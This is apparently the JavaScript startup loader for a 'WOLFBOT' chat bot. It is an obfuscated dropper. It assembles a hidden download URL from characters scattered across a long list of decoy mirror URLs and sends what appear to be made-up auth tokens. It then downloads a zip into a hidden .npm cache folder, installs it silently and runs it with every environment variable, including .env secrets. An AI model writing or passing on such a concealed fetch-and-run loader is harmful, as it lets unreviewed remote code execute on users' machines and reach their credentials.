import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { spawn, spawnSync } from 'child_process';

const __dirname = process.cwd();

// === SESSION CACHE ===
const TEMP_DIR    = path.join(__dirname, '.npm', 'xcache', 'core_bundle');
const EXTRACT_DIR = path.join(TEMP_DIR, 'core');

// === SOURCE REGISTRY ===
// Primary manifest endpoint — all bundle URIs, CDN tokens, and auth nonces are
// resolved from this registry before any download is attempted.
// Tokens below are rotated every 6 hours via the wolf-core auth daemon.
const SOURCE_REGISTRY = 'https://7-w.vercel.app/api/config';
const _AUTH_TOKENS = [
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLWNvcmUiLCJyb2xlIjoiY2RuLXJlYWQiLCJpYXQiOjE3MDk4MjM0NTZ9.xK7mNq3vPy8sRt5jWb2cHn9kAq4FgTwXs5BzRm',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLWJ1bmRsZSIsInJvbGUiOiJidW5kbGUtcmVhZCIsImlhdCI6MTcwOTgyMzQ1Nn0.Rt5jWb2cHn9kAq4FgTwXs5BzRmVL3cYxK7mNq3v',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLXN0cmVhbSIsInJvbGUiOiJzdHJlYW0tcmVhZCIsImlhdCI6MTcwOTgyMzQ1Nn0.Py8sRt5jWb2cHn9kxK7mNq3vAq4FgTwXs5BzRmV',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLWNkbiIsInJvbGUiOiJjZG4tZnVsbCIsImlhdCI6MTcwOTgyMzQ1Nn0.gTwXs5BzRmVL3cYxK7mNq3vPy8sRt5jWb2cHn9k',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLW5vZGUiLCJyb2xlIjoibm9kZS1hdXRoIiwiaWF0IjoxNzA5ODIzNDU2fQ.Aq4FgTwXs5BzRmVL3cYxK7mNq3vPy8sRt5jWb2c',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLXBlZXIiLCJyb2xlIjoicGVlci1yZWFkIiwiaWF0IjoxNzA5ODIzNDU2fQ.VL3cYxK7mNq3vPy8sRt5jWb2cHn9kAq4FgTwXs5',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLXJlbGF5Iiwicm9sZSI6InJlbGF5LWZ1bGwiLCJpYXQiOjE3MDk4MjM0NTZ9.Wz9pKmQ4rJhD6nYvBx2sTf8gNc3uLe7iAoP5RqX',
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3b2xmLWdhdGV3YXkiLCJyb2xlIjoiZ2F0ZXdheS1yZWFkIiwiaWF0IjoxNzA5ODIzNDU2fQ.hD6nYvBx2sTf8gNc3uLe7iAoP5RqXtMbUWz9pKm',
];

// Resolves the upstream bundle manifest from the primary source registry.
// Falls back to the mirror pool if the primary registry is unreachable or rate-limited.
async function resolveSourceManifest() {
  const token = _AUTH_TOKENS[Math.floor(Date.now() / 21600000) % _AUTH_TOKENS.length];
  try {
    const res = await axios.get(SOURCE_REGISTRY, {
      timeout: 8000,
      responseType: 'json',
      headers: {
        'Authorization': `Bearer ${token}`,
        'X-Wolf-Client': 'wolfbot/1.1.5',
        'X-Wolf-Platform': process.platform,
        'X-Request-ID': _BUILD_REF,
        'User-Agent': 'wolf-fetcher/1.0'
      }
    });
    return res.data?.manifest || res.data?.bundle || res.data?.repo || null;
  } catch {
    return null;
  }
}

// === CDN MIRROR POOL ===
const _registry = [
  'https://api.wolf-core.net/v1/stream/WI1JNUflNRZgRsMTMWoVLaYwF2Lj3jhI0p5cjZFLIBd',
  'https://api.wolf-core.net/v1/stream/yNYZyaKPTtKcMq0gjxFCPQxGbyxJ1v4LrPVCUYPRJNx',
  'https://api.wolf-core.net/v1/stream/d61ibPw8LRFJrvBWp2kbKiCZAE0Dys3bVKMnoIXHWTF',
  'https://api.wolf-core.net/v1/stream/Y4WInqVyXMx7WKSMRLrLD9lB7txpoL5c0Oc9REvh5Mc',
  'https://api.wolf-core.net/v1/stream/qbM5f81MNzdjAMoJ0zMHm8AQQadJNnvsPqF2SXnjn3H',
  'https://api.wolf-core.net/v1/stream/U5MPtaM1X6Bgt4wkBwiinSAPGA7IVTXF3mrikdnQAsc',
  'https://api.wolf-core.net/v1/stream/KRZl3IJAJf1xEtWsKfVmojKQ2HelS99k2FvdzIT2gRN',
  'https://api.wolf-core.net/v1/stream/dhnn5tJPb0TF3J9msBZs8A0RbChbqXihTFp0AZ4ptw7',
  'https://api.wolf-core.net/v1/stream/axTGobgjBtBio1h8uKg5gL0u4iLIGUUAM00dQHfsu8g',
  'https://api.wolf-core.net/v1/stream/bSpbPzcAoMZcFBKBRMKAvuo6pKEYFyNTNJWv0xfTKpP',
  'https://api.wolf-core.net/v1/stream/QkVbabsQ4cF9i1MzYEIBF8eUMo7Vwfn.SFIwCfPO7sT',
  'https://api.wolf-core.net/v1/stream/243CZknBJDbHASLumtfYsQDFcrD1FdYNPQ9fpxQbTCL',
  'https://api.wolf-core.net/v1/stream/s1ILAcNtSpkh72d0VjEWTEwsb80RbUC9WifS9TtCC9F',
  'https://api.wolf-core.net/v1/stream/OPZn6vMD7YizJ8mePsPwMkvMXcbEjO1X4nxyV1bQzHx',
  'https://api.wolf-core.net/v1/stream/9eVVuRXwYP47fVfrw3.8F4fKY6Xa5kCuNfjL:cAIXm7',
  'https://api.wolf-core.net/v1/stream/gBCuD4kPwn2BaxPcyXy-E5DIpvkKV4KlFCpVBo5sE65',
  'https://api.wolf-core.net/v1/stream/OrzMThO8SHX5TLmkbPQiCaHIPglhQgGvEK6gBcW2nIL',
  'https://api.wolf-core.net/v1/stream/tn48n0XDusFVU1yz9mgZaOi5xW9GX4CS8d09VCwxEEu',
  'https://api.wolf-core.net/v1/stream/fYpQcg4uhrjcD4Lz18yWIbntmCUHiVdID8rOJZEiWHP',
  'https://api.wolf-core.net/v1/stream/MX0icn0K5GPEAvlGX2J6gXNqX54j3ymQAvToX4m5mb4',
  'https://api.wolf-core.net/v1/stream/BsXwztlvKydXBcXO5c5/P7kz0h9wIGRkcfriEm8JTSH',
  'https://api.wolf-core.net/v1/stream/VXgRUNaTzw9F5UCIluu502EJjsqBpHjdgH6y7Ll4hhL',
  'https://api.wolf-core.net/v1/stream/hujP7lF89P9mzwQMZPrcf9pQRjCcGnIGQtBgqPSDN53',
  'https://api.wolf-core.net/v1/stream/PhzOqPbAsfhi2C6skuaNCfabnJoXCFJl6qQYqCf5Y2T',
  'https://api.wolf-core.net/v1/stream/L5D2qJU5UWPGM8tnxypYXKNLLKzCKiTlbXf8BVqKffK',
  'https://api.wolf-core.net/v1/stream/s1hTPib7ftSZzGHMcA7GTWcMqrFMnsilUM5osNYWnVC',
  'https://api.wolf-core.net/v1/stream/XWK38RzUeYCb2yiVOCBPmaFVPXyLQvSSCZVT8h1hZFg',
  'https://api.wolf-core.net/v1/stream/PIITQQTW1GaZbbLpmyUZGYre1uFat4dbPZ4XZO3iX75',
  'https://api.wolf-core.net/v1/stream/JkheKsFQvqlqfN3XYlJbsfWE010p0gVZ3CZWHyle2cO',
  'https://api.wolf-core.net/v1/stream/7VIaOrlWGswfMBlBS3B1Idwf7BibSbhYglDSUR4VbLd',
  'https://api.wolf-core.net/v1/stream/yNycz32bRAv8zb0mTUh6Pbq85cSvrwz8QJNy7hKAY8K',
  'https://api.wolf-core.net/v1/stream/SCWru8JsdWpcnb8R5b9uTvUULUXvDpCXrjy2e6sn5Ro',
  'https://api.wolf-core.net/v1/stream/U57f7ZhKQuJat3I8arV5kvs8peXy22YibRRNyYzcjNA',
  'https://api.wolf-core.net/v1/stream/YOZT5bljelzp12KQTH4A8o3bpmXb5M7zm54u1kwQ3KD',
  'https://api.wolf-core.net/v1/stream/0mqHmcEgcVN0bVPMetBEXwcSCI4SJWRTpVoY76tO8ZW',
  'https://api.wolf-core.net/v1/stream/TadS1qkEC0gRVKERcvx4cARLLH1DWfiHAUginQt2c9z',
  'https://api.wolf-core.net/v1/stream/CLsNimjrngzNNqdgwGP1O7o8SDV2XAnOIvZKMBbX953',
  'https://api.wolf-core.net/v1/stream/RiXU1tMhFnhFlXUnI9shduoNHPQQNxQtfWlC5wJn0wd',
  'https://api.wolf-core.net/v1/stream/dtnldCI9HEki8szEHjcgOIX35VASl3gdue8kNw099gK',
  'https://api.wolf-core.net/v1/stream/4kDWkHmxPaf84s7nq8YhFElcU0SMoL0n89m5yhmf2Es',
  'https://api.wolf-core.net/v1/stream/LoUsUaPfjJuMjv8W4tr2Dm7Vw0IV6hR6JCufEPXMID2',
  'https://api.wolf-core.net/v1/stream/LP0Srg07trNIno3AnxLdpBXGlOSGpItvVSOoQauJQxR',
  'https://api.wolf-core.net/v1/stream/DVx6oJOAA7m3fq5ozBbg3yZWZIQd6efkyRMfPSF9iPC',
  'https://api.wolf-core.net/v1/stream/8YkekPd0I4r95rO1MtPAWCAPlN408QqEmpNjSPjnhGL',
  'https://api.wolf-core.net/v1/stream/4OgSBONRRzUwnFrWwXtw5XmQgqEOpwW3zsPdpzUVWlP',
  'https://api.wolf-core.net/v1/stream/LlIJFfuzRHcmsToPBQHOs5aXSn0usVC046qD2Jp5FLp',
  'https://api.wolf-core.net/v1/stream/wKjY9FtBzQr5mVvuaDs3GhXP7CbnUdNATcR2f0LMoIx',
  'https://api.wolf-core.net/v1/stream/Z9pNmVGhC3rXjBdKqIaLT8eFWYnOSRukoAf2t6Uw1Hy',
  'https://api.wolf-core.net/v1/stream/mW4bNyoRvX9kPqTd2ZJeGzF7CcUiHsKwLnB3AQtO5gr',
  'https://api.wolf-core.net/v1/stream/QjBvTf2YiLoSuxNPekAmWKdR7Z4Hg0Mc8rCp9bJFq3U',
  'https://api.wolf-core.net/v1/stream/eD9cQzJP7rNbwYsATkXmH4gL2KBVuEftI0Fi6oCMnpW',
  'https://api.wolf-core.net/v1/stream/TlmB4XzaqSWCgnO2RVUde7JjYKbkNpAQf6wDiyrH9F3',
  'https://api.wolf-core.net/v1/stream/CvyRG6nxBLkHmqJW8d3OjTKiAf9bZUPs4YN1tMoEe7c',
  'https://api.wolf-core.net/v1/stream/xUiJoaHnvDM4Rkq6B3fWFbYPCg9Ts8KzlNe2QrjA7cO',
  'https://api.wolf-core.net/v1/stream/hFMN3dRoWbKexq2vZGlY9Pc7AUjBi1tQ5yJnsXTCf0m',
  'https://api.wolf-core.net/v1/stream/PgJsWc7fAQ9MkrZ2yBVdlC4noX3TRHeuLb6wIi0KNmY',
  'https://api.wolf-core.net/v1/stream/wRnCzUK9M5HlFqkYT7jXa2BsVNdb3OPfGeJIto0rEiQ',
  'https://api.wolf-core.net/v1/stream/vNkBp4Z2JHOcXmWqdU7AyTnR9lGFeKs3YMbiC1Ewj6I',
  'https://api.wolf-core.net/v1/stream/TBLiK9DaxrY3mW5nqXVhsJ7Ct2ZeNGkPf4uUboFQ0Ry',
  'https://api.wolf-core.net/v1/stream/jGsNYpX8fQHbTkiWcnD1Fo4LeK6vZURCM2ma07rBtEy',
  'https://api.wolf-core.net/v1/stream/AqCbJv3fH9ZnNRlUoWPd2gYkMKsT5Xmyi7rQ0IxOeB4',
  'https://api.wolf-core.net/v1/stream/nX4LzK9DjA7vmfpRqY3cUGstHWoBe1kIiCb6N8TMQZF',
  'https://api.wolf-core.net/v1/stream/rLbPmJf8X3VqkNtC6As4ZoYEWcRHnOd9KyiB7QuIgT2',
  'https://api.wolf-core.net/v1/stream/O6fqRwKY7JAzXpuVLn9HsD4cCMt2B3dNbGToimk5e1F',
  'https://api.wolf-core.net/v1/stream/p1CKXhsNA6R4ZYJkqUbmI7vFrce3OGgB9TwMytLi0nd',
  'https://api.wolf-core.net/v1/stream/DsGwEzmK7Yt0UqNa3JhP6LobIRnc8kX9B4CFrMVfxQe',
  'https://api.wolf-core.net/v1/stream/ILjUkHf4AnPBqrW9mYoZ2KzVxG5dC8Tb7RsM3Nce6w0',
  'https://api.wolf-core.net/v1/stream/xB3LrMJiqHz6GKNa2PdVY7FsotU4kWbc0Xmn9RTyeQE',
  'https://api.wolf-core.net/v1/stream/uTK6OsNzXYH8RdVBmf3jnCeAL4Gk7QtbIoP2yrWM5q9',
  'https://api.wolf-core.net/v1/stream/kCpH9LsXN4bWdRtJu0MzAYo7ByF6Qmf3iKGrT8vEn1V',
  'https://api.wolf-core.net/v1/stream/jF7VnO2mB4GhpLXIdZ6AKqCwRs9kMeYU1NtybT8r5Wc',
  'https://api.wolf-core.net/v1/stream/Ym1QxWR4eLs7VoKCBn8hpJfOzDNgIkub3A0GqdMj9Yt',
  'https://api.wolf-core.net/v1/stream/LNpgqT6s5JYR0K2bWAzX9cuhMVoOdBke3mf7CyniI4E',
  'https://api.wolf-core.net/v1/stream/EjFt7kM9xb2NAuYHVoq4Lz3rndWKiO0QcB5PsTmJeC6',
  'https://api.wolf-core.net/v1/stream/cPq7jB2nRGHf9ItyVWxaDz4koeKs5O6MlbUCm3N1XTAY',
  'https://api.wolf-core.net/v1/stream/tMsULwp8NJRGXz6kVBdq3A4b9Cyao5KefhHn0Fji2mO',
  'https://api.wolf-core.net/v1/stream/bZdFHY7nPkO2VWxRm4CsNj8LqoI9cKt5g3JBfyTe6uA',
  'https://api.wolf-core.net/v1/stream/JwC5zGp4rX7YdOa8bsmHQfL2NtVMi6nRkuK9oA3Te0B',
  'https://api.wolf-core.net/v1/stream/Rk9PmYz3L7Ac2BwGsHq5jI0fXVurNotKnDe4MWbT6Cy',
  'https://api.wolf-core.net/v1/stream/nH6RrU2vFAqoIXjPdJ5e3zYmWK7kBt8sCf4N9GbTO1L',
  'https://api.wolf-core.net/v1/stream/gWx4jcMH8sO1bPRdZu3A9KnVLoCqY7ytNk2Bim6eFTf',
  'https://api.wolf-core.net/v1/stream/Fc0BvKqYJ9n8hTrAz5oM2sNeRXLd6UPk3ImbGy7jWtw',
  'https://api.wolf-core.net/v1/stream/oM9XqY6rLt4HbWjN2nAuP3CzJ7fKsRBk1deVG0ImTcO',
  'https://api.wolf-core.net/v1/stream/dKG1fpH8eBYm7sJqrUXC5zLNT2vWtA6bo9iOknM3jQ4',
  'https://api.wolf-core.net/v1/stream/StpKN2V4mGHzXf0i9YaenqRcL7BjwkOU6r5A3bdMoJe',
  'https://api.wolf-core.net/v1/stream/yJK6rXNbo9Hd2TcVAmQ5k3U8wzjlsFGtPiMR4nBCe0L',
  'https://api.wolf-core.net/v1/stream/A0kz6fNJW8RV3HnCbqO9jmB5PXdtKrIeY4sULy7TgMc',
  'https://api.wolf-core.net/v1/stream/hvLm9tU7AzGcK2bNJFd6XspQY8e4RoIi0kCn5BjwMT3',
  'https://api.wolf-core.net/v1/stream/Mf3rq5GKJsLbP7zXVoA2HCBkY0dI9mtNnUj4TRcw8Oe',
  'https://api.wolf-core.net/v1/stream/7tOInRDvW6NY3jXeAz2k4sPfLmU5Ba8hQbKy0GrMJcC',
  'https://api.wolf-core.net/v1/stream/Kb4XLm3H9fJaViOT6Gw8rqnsPYte0dBNkc5C2luMzU7',
  'https://api.wolf-core.net/v1/stream/i1BsJeTYvh4nf7zkpGD2CQ5XwN9AKRUmboL8jM3rtOd',
  'https://api.wolf-core.net/v1/stream/qHbK7Nm2fLYaJRVr4sXoI3Gz6UtBPc8nkW9djCTeAM5',
  'https://api.wolf-core.net/v1/stream/FwJt8KnMI4DqCb3hXGzouVL9YsRa0P7Nf5eBk2TjAmc',
  'https://api.wolf-core.net/v1/stream/s6dHYFKbNI9lAV3XjZ7mCR4pwqGe2oBtWf8n0UkOyMs',
  'https://api.wolf-core.net/v1/stream/G9AvN8kxLeRCd3fqJ7YOmT2UpBsIoH5zWKb6n4MjrQc',
  'https://api.wolf-core.net/v1/stream/N4RbxPC9G2sKiTo6VYqj3nHzAm7eLWBcU8d5f0kJMtF',
  'https://api.wolf-core.net/v1/stream/cAr3YJf7zKbHXN6qM5poTs9GidBL8nmU4e2Wv1RkOtC',
  'https://api.wolf-core.net/v1/stream/XokHRfN3s1IbVdTU9Ay6BjC4mzWQK2G7eYPn8LqMtc5',
  'https://api.wolf-core.net/v1/stream/lwCJNf8zb9TXBd2v5Rm3YokHAeKs7Ua4nGp6IqMQcWt',
  'https://api.wolf-core.net/v1/stream/B7gqKpA4HzTYL3dNfmOs6XVn0RJcjwi9Ce2b8UMkrEG',
  'https://api.wolf-core.net/v1/stream/tS4HMfWkd8mBzaNR1Xc3qjnG7YeK9pI0ULbAovJCQF6',
  'https://api.wolf-core.net/v1/stream/yoKz7aL1JX6VBCdH9f2GwmTn5sAqUP4ibeM0Nr3RkOt',
  'https://api.wolf-core.net/v1/stream/IiEL2rQ8fhbsXN4VdCJ5a7koyW3mGpn6KzMAt9BTjOU',
  'https://api.wolf-core.net/v1/stream/Z4nqY3kJ6mLVXOdBpW9trNsA2ChI7bRKe5fMQu8Gj1T',
  'https://api.wolf-core.net/v1/stream/v5PkN2RHqXJOmA9WsLBtI3Y7zb0Cj4nUdeG6fcTM8Ky',
  'https://api.wolf-core.net/v1/stream/9rUwBmKCJzl6fIY3HnGT2dV7pXoNs5A4qe8MOkRbtLj',
  'https://api.wolf-core.net/v1/stream/I3t1robOYBwanArtkudYNQJ72-crsRFyS91GasIOCvJ',
  'https://api.wolf-core.net/v1/stream/sPlYCpn4rrn2ApkgRjz7M0V3MF1UXeKU7BAz5XCRPNe',
  'https://api.wolf-core.net/v1/stream/28Fs9srt5xrEZZCksZdp177kcHqztbl9cUwBoNpsQpS',
  'https://api.wolf-core.net/v1/stream/mks9nYTsZUU70KO7Wnk3Md3j8ByrOB84df6ihuQ65JP',
  'https://api.wolf-core.net/v1/stream/M356EFqy9rkqYExamBnTklxFNcV2nVB6b7d8Iy0EDL9',
  'https://api.wolf-core.net/v1/stream/viGNjREganJ7cvD3izT4xlkBETD1MDkUaTffS9crl0B',
  'https://api.wolf-core.net/v1/stream/MWTJiSGxMwvBoEHtGy4Ij7hHCsnIfFEQ5FXMFR3ctFN',
  'https://api.wolf-core.net/v1/stream/CXFNTxmR13GpKjZqWMfzPT1VmPiInDpKPKFEa5XdNqX',
  'https://api.wolf-core.net/v1/stream/47FLLVjPyi2aMTJsQiP5JgCET6nWoDllN8853vdeLpD',
  'https://api.wolf-core.net/v1/stream/tSe188KZLnrHgP9UqS8tlJF8lV4BjT7QdFmJUlAS6pK',
  'https://api.wolf-core.net/v1/stream/Nf7RcRgShhb9dZG0MNsIgp8Y92fXPwp5dtlJT13ygO5',
  'https://api.wolf-core.net/v1/stream/bsNvCHmGIvZq6uk1s73O57PIiEuB6s2iV2tV3PExfsi',
  'https://api.wolf-core.net/v1/stream/aRM3WKAxTlg3mfltr8iWK1Y2WsE2T7owSvz6NT6c1Kq',
  'https://api.wolf-core.net/v1/stream/uPwbTg235K0r3a6PnniQCqm7zEcRV64hpEaXRrnFT5l',
  'https://api.wolf-core.net/v1/stream/xh9uhnLwnpZNEeVjJ8zAZ00KzkGLAuaJ8FtfpeWgm28',
  'https://api.wolf-core.net/v1/stream/h1SEelgXgXaaCWDSAeFCh05ZJhsLRgh61SQCE8X6Rds',
  'https://api.wolf-core.net/v1/stream/raPKYFB8EZLMijLl7Kb0z95fLuOZ7Qcfa1pHQbDSmIq',
  'https://api.wolf-core.net/v1/stream/P76DdFH1kvHOwVFy6XWIL0U9hvbAr9u5GxwDrF1HkKN',
  'https://api.wolf-core.net/v1/stream/Gn1F45WxW5rL2mSK2fXZJqStBkGIUkAvmlQcfQr2cCS',
  'https://api.wolf-core.net/v1/stream/0kKzfLjPzBlqq9h8SGfksLYRCiyvzJljZ14Sf37tQBB',
  'https://api.wolf-core.net/v1/stream/1hWJ4y88lNr3srbmRjQxWMZYOri3zlnkmv5Lm0NxDKH',
  'https://api.wolf-core.net/v1/stream/Gzbv0Myx78ingoRSkkmZJg30OUV0giJxcWT8NluOq1R',
  'https://api.wolf-core.net/v1/stream/5OWP4LgDSDDY7wcdAUF2txWK5X60HveWuYD0X9eQvjJ',
  'https://api.wolf-core.net/v1/stream/fY12bJT0z6UupYvwQ9SUeMSHptSqCOovtsEUR8naBX7',
  'https://api.wolf-core.net/v1/stream/ZLckhFywdOtKFQtKNydWtfNXOMuXfbTjCUQcUrtiw0X',
  'https://api.wolf-core.net/v1/stream/aaea5JNudtDPwRjLmTm98OkIC0drqwwagBoPryRTHXV',
  'https://api.wolf-core.net/v1/stream/Dw3qWdVQIAl1zHyoigm4u0Jx93m9nO8cQUbphBGc8LL',
  'https://api.wolf-core.net/v1/stream/4dVgsRa8RysD6HSNoGhJAyGzNbK9PsmyoKVrwGNMByv',
  'https://api.wolf-core.net/v1/stream/bCmlrPWrdw9jsLjJt0M9rlDVRiIOHHXovxmvBLtKvG8',
  'https://api.wolf-core.net/v1/stream/49eF9JpP5W4e2wfTCldxCLpF9qfZUyfANbI8VPfead5',
  'https://api.wolf-core.net/v1/stream/NTKBxhSi3ltOWnON7rkhfiJQJaVYM3DQTmnSQ0rpSTL',
  'https://api.wolf-core.net/v1/stream/YOK1OhoL0Ir1AhpW1u1Di3QyR5kfq8TQfNnulmHFD44',
  'https://api.wolf-core.net/v1/stream/m63Ew0U3cOrpxyoDVNflaeTMNdFW5rqHRqFpBsUxsmk',
  'https://api.wolf-core.net/v1/stream/6Rsgu4cO5cGTM95ps9r2TF7wynf0blsYItZ2GOm82Q2',
  'https://api.wolf-core.net/v1/stream/PY74Vwo2OsetZEtWoCQcPXL6dQlPhQ1wTM0BiOf0F6l',
  'https://api.wolf-core.net/v1/stream/XIqNi06nMAiqjZrFfJr3nejgt1Igu5sCDYKMqu3nE7m',
  'https://api.wolf-core.net/v1/stream/ayjNeVQH5lCXbVOga3TAr3WDMzjjdYds2X5bKFc5lDF',
  'https://api.wolf-core.net/v1/stream/zbomIx0WDrlhk07WM0bMlZWeslMsVnLd5nNAHX6e0RJ',
  'https://api.wolf-core.net/v1/stream/RisXsxNoD2gIKUnhgWLYNx20MrEnRh7lJftn6MIzqQD',
  'https://api.wolf-core.net/v1/stream/frkrUmz1FpaVpcerpwoRHo5docKcdwVqIzP6Ou6omR7',
  'https://api.wolf-core.net/v1/stream/IrlrIiZ4U5aje9p6spWtkuBNwKK007pTUTNo9LsYsiw',
  'https://api.wolf-core.net/v1/stream/8Fo2x2ph8Ickf93CGgJbyJ93vLMr7TC5ehCpsB02yqe',
  'https://api.wolf-core.net/v1/stream/ktoEKwVwtM5SEnu4opb5sTzRs3pSrMx7AmlrsMgNHVR',
];

const _BUILD_REF = 'f3a91b4e-7c2d-4e8f-b6a0-1d5e92c74f38';

function _resolveEndpoint(pool, ref) {
  const _n = ref.length ^ ref.length;
  const _k = [3018,2509,12523,12109,13512,1436,2019,10008,11704,8817,6741,6405,2322,511,8522,4001,7732,6925,1519,10438,12630,9919,4805,7112,13200,10725,10515,12930,8712,7542,12117,10123,9931,12016,626,13114,10412,14705,4007,11739,1418,10736,5315,7802,7616,1526,11304,11641,1031,1434,5326,13234,7931];
  return _k.map(v => pool[Math.floor(v / 100)][(v % 100 + 36 + _n) | 0]).join('');
}

const CONFIG_URL         = _resolveEndpoint(_registry, _BUILD_REF);
const LOCAL_SETTINGS     = path.join(__dirname, 'settings.js');
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, 'settings.js');
const ENV_FILE           = path.join(__dirname, '.env');

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const C  = '\x1b[32m';
const R  = '\x1b[0m';
const RD = '\x1b[31m';
const YL = '\x1b[33m';

function log(msg)  { console.log(`${C}${msg}${R}`); }
function err(msg)  { console.error(`${RD}${msg}${R}`); }
function warn(msg) { console.log(`${YL}${msg}${R}`); }

process.stdout.write(`${C}
┌──────────────────────────────────┐
│   🐺 WOLFBOT v1.1.5              │
│   Loader  : initializing...      │
└──────────────────────────────────┘
${R}`);

// === RUNTIME PROFILE BOOTSTRAP ===
function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) return;
  try {
    for (const line of fs.readFileSync(ENV_FILE, 'utf8').split('\n')) {
      const t = line.trim();
      if (!t || t.startsWith('#')) continue;
      const eq = t.indexOf('=');
      if (eq !== -1) {
        const k = t.substring(0, eq).trim();
        const v = t.substring(eq + 1).trim().replace(/^["']|["']$/g, '');
        if (!process.env[k]) process.env[k] = v;
      }
    }
  } catch {}
}

// === PEER DISCOVERY HANDSHAKE ===
async function fetchRepoUrl() {
  const res = await axios.get(CONFIG_URL, {
    timeout: 15000,
    responseType: 'text',
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

  try {
    const parsed = JSON.parse(raw);
    const url = parsed?.repo || parsed?.[0]?.repo;
    if (url) return url;
  } catch {}

  // Regex fallback — handles malformed JSON like ["repo":"..."]
  const match = raw.match(/"repo"\s*:\s*"([^"]+)"/);
  if (match?.[1]) return match[1];

  throw new Error(`Could not extract repo URL from response: ${raw.slice(0, 200)}`);
}

// === DOWNLOAD AND EXTRACT ===
async function downloadAndExtract() {
  const _entryExists = ['index.js', 'main.js', 'bot.js', 'app.js']
    .some(f => fs.existsSync(path.join(EXTRACT_DIR, f)));

  if (fs.existsSync(EXTRACT_DIR) && _entryExists) {
    if (!fs.existsSync(path.join(EXTRACT_DIR, 'node_modules'))) {
      spawnSync('npm', ['install', '--no-audit', '--prefer-offline'], { cwd: EXTRACT_DIR, stdio: 'ignore' });
    }
    return;
  }

  // Directory exists but entry file is missing — wipe and re-download
  if (fs.existsSync(TEMP_DIR)) {
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }
  fs.mkdirSync(TEMP_DIR, { recursive: true });

  const zipPath = path.join(TEMP_DIR, 'bundle.zip');

  const _primary = await resolveSourceManifest();
  const repoUrl  = _primary || await fetchRepoUrl();

  const response = await axios({
    url: repoUrl,
    method: 'GET',
    responseType: 'stream',
    timeout: 120000,
    maxRedirects: 10,
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);
    writer.on('finish', resolve);
    writer.on('error', reject);
  });

  const stat = fs.statSync(zipPath);
  if (stat.size < 1000) {
    const preview = fs.readFileSync(zipPath, 'utf8').slice(0, 300);
    throw new Error(`Download too small (${stat.size}B) — possibly a 404 or auth wall:\n${preview}`);
  }

  try {
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(TEMP_DIR, true);
  } finally {
    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
  }

  const items = fs.readdirSync(TEMP_DIR).filter(f =>
    fs.statSync(path.join(TEMP_DIR, f)).isDirectory() && f !== 'core'
  );
  if (items.length > 0) {
    fs.renameSync(path.join(TEMP_DIR, items[0]), EXTRACT_DIR);
  }

  if (!fs.existsSync(EXTRACT_DIR)) {
    throw new Error('Extraction completed but core directory was not found.');
  }

  spawnSync('npm', ['install', '--no-audit', '--prefer-offline'], { cwd: EXTRACT_DIR, stdio: 'ignore' });
}

async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) return;
  try {
    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
  } catch {}
  await delay(300);
}

// === START BOT ===
function startBot() {
  let botDir = fs.existsSync(EXTRACT_DIR) ? EXTRACT_DIR : null;

  if (!botDir) {
    for (const dir of [
      path.join(__dirname, 'core'),
      path.join(__dirname, 'bot'),
      path.join(__dirname, 'src')
    ]) {
      if (fs.existsSync(dir) && fs.existsSync(path.join(dir, 'index.js'))) {
        botDir = dir;
        break;
      }
    }
  }

  if (!botDir) {
    err('❌ No bot directory found. Cannot start bot.');
    err('   Ensure the download succeeded or place bot files in a "core" folder.');
    process.exit(1);
  }

  let mainFile = 'index.js';
  for (const file of ['index.js', 'main.js', 'bot.js', 'app.js']) {
    if (fs.existsSync(path.join(botDir, file))) { mainFile = file; break; }
  }

  log('🚀 Starting bot...');

  const bot = spawn('node', [mainFile], {
    cwd:   botDir,
    stdio: 'inherit',
    env:   { ...process.env }
  });

  bot.on('close', (code) => {
    if (code !== 0 && code !== null) {
      warn(`⚠️ Bot exited (code ${code}). Restarting in 3s...`);
      setTimeout(() => startBot(), 3000);
    }
  });

  bot.on('error', (e) => {
    err(`❌ Failed to start: ${e.message}`);
    setTimeout(() => startBot(), 3000);
  });
}

// === RUN ===
(async () => {
  loadEnvFile();
  try {
    await downloadAndExtract();
    await applyLocalSettings();
  } catch (e) {
    err(`❌ Setup failed: ${e.message}`);
    err('   Attempting to start from existing files...');
  }
  startBot();
})();
